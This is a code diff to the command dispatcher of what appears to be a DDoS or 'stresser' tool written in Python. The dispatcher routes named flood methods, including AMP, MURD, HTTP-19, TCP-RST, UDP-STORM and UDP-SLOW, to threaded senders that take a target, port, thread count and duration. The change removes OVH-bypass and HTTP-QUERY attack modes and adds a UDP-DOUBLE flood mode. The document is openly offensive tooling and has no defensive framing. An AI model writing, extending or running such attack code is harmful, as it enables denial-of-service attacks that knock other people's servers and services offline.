@@ -50,8 +50,6 @@ def handle_attack_command(com, languages, attack_type,mode,more=''):
            if len(com) == 5:target,thread,times,meths = com[1], com[2], com[3],com[4]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {times} {meths}')).start(); c = 1
         elif mode == 5:
            if len(com) == 6:target,port,thread,times,meths = com[1],com[2], com[3], com[4],com[5]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {meths}')).start(); c = 1
-        elif mode == 4:
-           if len(com) == 7:target,port,thread,times,booters,meths = com[1],com[2], com[3], com[4],com[5],com[6]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {port} {thread} {times} {booters} {meths}')).start();  c = 1
         elif mode == 3:
            if len(com) == 4:target,thread,meths = com[1], com[2], com[3]; threading.Thread(target=type_sender, args=(attack_type, f'{target} {thread} {meths}')).start(); c = 1
         if c == 0:
@@ -98,16 +96,12 @@ def controler():
         elif a in ['AMP','أمب','ขยาย']:handle_attack_command(com, languages, 'AMP',2)
         elif a == 'MURD':handle_attack_command(com, languages, 'MURD',3)
         elif a in ['MURD-OPT','MURD_OPT','MURDOPT']:handle_attack_command(com, languages, 'MURD',3,'MURD-OPT')
-        elif a in ['OVH_RPS','OVH-RPS','أوفه-آربيس','OVHRPS']:
-           if len(com) != 1 and len(com) != 7:com.append('GET')
-           handle_attack_command(com, languages, 'OVH-RPS',4)
-        elif a in ['OVH-CONNECT','OVH-الاتصال','OVH_CONNECT','OVHCONNECT']:
-            if len(com) != 1 and len(com) != 7:com.append('GET')
-            handle_attack_command(com, languages, 'OVH-CONNECT',4)
-        elif a in ['HTTPQUERY','HTTP_QUERY','HTTP-QUERY']:handle_attack_command(com, languages, 'HTTP-QUERY',4)
         elif a in ['HTTP_19','HTTP-19']:handle_attack_command(com, languages, 'HTTP-19',5)
         elif a in ['TCP-RST','TCPRST','TCP_RST']:handle_attack_command(com, languages, 'TCP-RESET',2)
         elif a in ['UDP-STORM','UDPSTORM','UDP_STORM']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-STORM')
+        elif a in ['UDP-DOUBLE','UDPDOUBLE','UDP_DOUBLE']:
+           if len(com) != 1 and len(com) != 5:com.append('methods/MODEL/kB-SIZE.txt')
+           handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-DOUBLE')
         elif a in ['UDP-SLOW','UDPSLOW','UDP_SLOW']:handle_attack_command(com, languages, 'TCP-RESET',2,'UDP-SLOW')
         elif a == 'PAPING':
            if len(com) == 5:
